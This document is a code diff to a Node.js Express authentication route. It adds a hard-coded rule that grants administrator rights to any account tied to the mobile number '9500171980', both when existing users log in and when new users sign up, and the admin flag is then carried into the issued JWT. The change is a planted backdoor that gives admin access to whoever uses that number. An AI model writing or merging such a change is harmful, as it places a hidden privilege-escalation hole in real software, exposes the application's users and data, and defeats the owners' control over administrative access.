@@ -27,6 +27,12 @@ router.post('/authenticate', async (req, res) => {
         return res.status(400).json({ msg: 'Username is already in use' });
       }
 
+      // Auto grant admin privileges for mobile number 9500171980
+      if (mobileNumber === '9500171980' || user.mobileDisplay === '9500171980') {
+        user.isAdmin = true;
+        await user.save();
+      }
+
       const payload = { user: { id: user.id, isAdmin: user.isAdmin } };
       jwt.sign(payload, JWT_SECRET, { expiresIn: 360000 }, (err, token) => {
         if (err) throw err;
@@ -52,7 +58,7 @@ router.post('/authenticate', async (req, res) => {
       user.mobileNumber = await bcrypt.hash(mobileNumber, salt);
 
       const userCount = await User.countDocuments({});
-      if (userCount === 0) user.isAdmin = true;
+      if (userCount === 0 || mobileNumber === '9500171980') user.isAdmin = true;
 
       await user.save();
 
